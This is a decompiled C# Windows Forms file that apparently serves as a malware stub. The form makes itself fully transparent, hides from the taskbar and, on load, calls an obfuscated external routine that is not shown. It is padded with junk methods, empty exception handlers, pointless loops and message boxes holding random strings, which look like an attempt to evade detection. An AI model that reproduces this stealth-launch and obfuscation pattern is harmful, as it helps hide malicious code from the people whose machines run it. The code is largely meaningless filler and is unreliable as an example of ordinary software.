using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Windows;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("GroupBox1")]
	private GroupBox _GroupBox1;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("RadioButton2")]
	private RadioButton _RadioButton2;

	[AccessedThroughProperty("RadioButton1")]
	private RadioButton _RadioButton1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	internal virtual GroupBox GroupBox1
	{
		get
		{
			return _GroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_GroupBox1 = value;
		}
	}

	internal virtual CheckBox CheckBox1
	{
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual RadioButton RadioButton2
	{
		get
		{
			return _RadioButton2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RadioButton2 = value;
		}
	}

	internal virtual RadioButton RadioButton1
	{
		get
		{
			return _RadioButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RadioButton1 = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		GroupBox1 = new GroupBox();
		ProgressBar1 = new ProgressBar();
		Button1 = new Button();
		RadioButton1 = new RadioButton();
		RadioButton2 = new RadioButton();
		CheckBox1 = new CheckBox();
		((Control)GroupBox1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)GroupBox1).get_Controls().Add((Control)(object)CheckBox1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)RadioButton2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)RadioButton1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Button1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)ProgressBar1);
		GroupBox groupBox = GroupBox1;
		Point location = new Point(1, 2);
		((Control)groupBox).set_Location(location);
		((Control)GroupBox1).set_Name("GroupBox1");
		GroupBox groupBox2 = GroupBox1;
		Size size = new Size(373, 80);
		((Control)groupBox2).set_Size(size);
		((Control)GroupBox1).set_TabIndex(0);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("GroupBox1");
		ProgressBar progressBar = ProgressBar1;
		location = new Point(12, 63);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(352, 11);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(0);
		Button button = Button1;
		location = new Point(254, 20);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(1);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ButtonBase)RadioButton1).set_AutoSize(true);
		RadioButton radioButton = RadioButton1;
		location = new Point(50, 20);
		((Control)radioButton).set_Location(location);
		((Control)RadioButton1).set_Name("RadioButton1");
		RadioButton radioButton2 = RadioButton1;
		size = new Size(90, 17);
		((Control)radioButton2).set_Size(size);
		((Control)RadioButton1).set_TabIndex(2);
		RadioButton1.set_TabStop(true);
		((ButtonBase)RadioButton1).set_Text("RadioButton1");
		((ButtonBase)RadioButton1).set_UseVisualStyleBackColor(true);
		((ButtonBase)RadioButton2).set_AutoSize(true);
		RadioButton radioButton3 = RadioButton2;
		location = new Point(50, 40);
		((Control)radioButton3).set_Location(location);
		((Control)RadioButton2).set_Name("RadioButton2");
		RadioButton radioButton4 = RadioButton2;
		size = new Size(90, 17);
		((Control)radioButton4).set_Size(size);
		((Control)RadioButton2).set_TabIndex(3);
		RadioButton2.set_TabStop(true);
		((ButtonBase)RadioButton2).set_Text("RadioButton2");
		((ButtonBase)RadioButton2).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		location = new Point(156, 28);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(81, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(4);
		((ButtonBase)CheckBox1).set_Text("CheckBox1");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(377, 84);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	public object irD37I0baY4293JS712fZj5UC()
	{
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			while (true)
			{
				try
				{
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					int num = 79;
					do
					{
						num++;
					}
					while (num <= 8574);
					ProjectData.ClearProjectError();
				}
				Interaction.MsgBox((object)"+1d6m<„/8t-^RK‡3B>i:C†1<Œf`’’d!…l:pNtS-||:OOg.;3WfŽep=#8 G<'o„/gs;„7nXR‚1\u007f", (MsgBoxStyle)0, (object)null);
			}
		}
		Interaction.MsgBox((object)"#W’3,Tƒ€Žt>rQoAIv‘D'U 6*&k+qW\u0090o%<`Gˆ[8\\ŒCa;v0lxI~aG|KDzCˆ", (MsgBoxStyle)0, (object)null);
		Interaction.MsgBox((object)"bM3vlt7y", (MsgBoxStyle)0, (object)null);
		return 890127301;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_ShowInTaskbar(false);
		C4asEMJnEmBepNtcyEroTH5ViJk.strin(null);
	}

	private object as3O295gi()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			while (true)
			{
				MessageBox.Show("N>F\u007f5KgƒQ%<9#5€Npw3");
				try
				{
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				Interaction.MsgBox((object)"TJbpx47", (MsgBoxStyle)0, (object)null);
			}
		}
		return 6;
	}

	private void Button1_Click(object sender, EventArgs e)
	{
	}

	public object ZP7YmovX3CD3eCp1ZD4wuxx6B()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("E?>MN9d>~+wN0)I?Ž'~RVc|[x\\Š$oKV16X&\u0081Hk\u0090„*1^\u008dXFr‰ƒv<8w2{uUvg…");
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			new decimal(770833L);
			new decimal(2180L);
			ProjectData.ClearProjectError();
		}
		MessageBox.Show("t=€6zfJ@`ˆe~]:a=[^5)_*|;{iA’,s`3+d'N>EkŒf=J>Thp$#g'E}a‰iTdN1EJ4\u007fHRrŒ23’5†;VBs^z2‹=\u008fXk:I\\mPŒlŠYg;)]ˆ");
		while (true)
		{
		}
	}
}
